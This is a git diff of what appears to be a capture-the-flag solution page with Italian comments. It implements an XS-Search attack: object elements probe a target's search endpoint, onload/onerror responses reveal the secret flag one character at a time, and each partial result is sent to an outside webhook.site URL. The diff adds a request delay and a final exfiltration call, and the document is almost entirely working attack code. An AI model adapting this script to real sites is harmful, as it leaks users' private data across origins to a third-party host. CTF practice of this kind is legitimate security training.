@@ -21,7 +21,10 @@
 
     <script>
         const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Caratteri validi
-        let currentFlag = ''; // Flag trovata
+        let currentFlag = 'ability'; // Flag parziale trovata
+
+        // Funzione di delay per inserire un intervallo tra le richieste
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
         const leak = async (url) => {
             return new Promise((resolve) => {
@@ -29,11 +32,11 @@
                 s.data = url;
                 s.onload = (e) => {
                     e.target.remove();
-                    return resolve(0); // Risorsa accessibile
+                    return resolve(0); // Risorsa accessibile (status 200)
                 };
                 s.onerror = (e) => {
                     e.target.remove();
-                    return resolve(1); // Risorsa non accessibile
+                    return resolve(1); // Risorsa non accessibile (status 404 o errore)
                 };
                 document.body.appendChild(s);
             });
@@ -42,10 +45,9 @@
         const logResult = async (message) => {
             const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
             try {
-                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                 const response = await fetch(urlWithParams, {
-                    method: 'GET', // Cambiato a GET
+                    method: 'GET',
                 });
 
                 if (!response.ok) {
@@ -59,27 +61,30 @@
         };
 
         const guessFlag = async (position) => {
-            // Se la lunghezza della flag è nota, puoi anche fermarti se hai raggiunto quella lunghezza
-            if (position >= currentFlag.length + 30) { // Sostituisci 10 con la lunghezza massima della flag prevista
+            // Ferma la ricerca se la flag è completa o se si è raggiunta la lunghezza massima prevista
+            if (position >= currentFlag.length + 30) {
                 console.log('Flag completa:', currentFlag);
+                await logResult(`Flag completa trovata: ${currentFlag}`);
                 return;
             }
 
             for (let char of validChars) {
-                const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`; // URL da testare
-                const result = await leak(url); // Esegui il leak
+                const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`;
+                const result = await leak(url);
 
                 if (result === 0) { // Risorsa accessibile (status 200)
-                    currentFlag += char; // Aggiungi carattere corretto
+                    currentFlag += char;
                     document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
                     console.log(`Flag parziale trovata: ${currentFlag}`);
-                    
-                    // Invia il log della flag parziale al Webhook
                     await logResult(`Flag parziale trovata: ${currentFlag}`);
-                    
-                    await guessFlag(position + 1); // Prova il prossimo carattere
-                    return; // Esci dopo aver trovato un carattere valido
+
+                    // Richiama la funzione per continuare a cercare il carattere successivo
+                    await guessFlag(position + 1);
+                    return;
                 }
+
+                // Ritardo di 100 ms tra le richieste
+                await delay(100);
             }
         };
 
